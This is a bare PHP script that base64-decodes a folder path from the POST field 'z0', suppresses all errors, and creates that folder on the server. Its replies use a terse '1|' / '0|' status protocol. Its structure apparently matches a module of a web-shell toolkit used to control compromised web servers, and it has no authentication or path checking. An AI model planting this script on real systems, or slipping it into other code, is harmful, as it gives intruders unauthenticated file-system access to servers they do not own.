<?php

@error_reporting(0);

function main() {
    $dir_name = base64_decode($_POST['z0']);
    if (is_dir($dir_name)) {
        echo('0|Folder already exists');
        return;
    }

    if (mkdir($dir_name, 0755, true)) {
        echo('1|');
    } else {
        echo('0|Failed to create folder.');
    }
}

main();

?>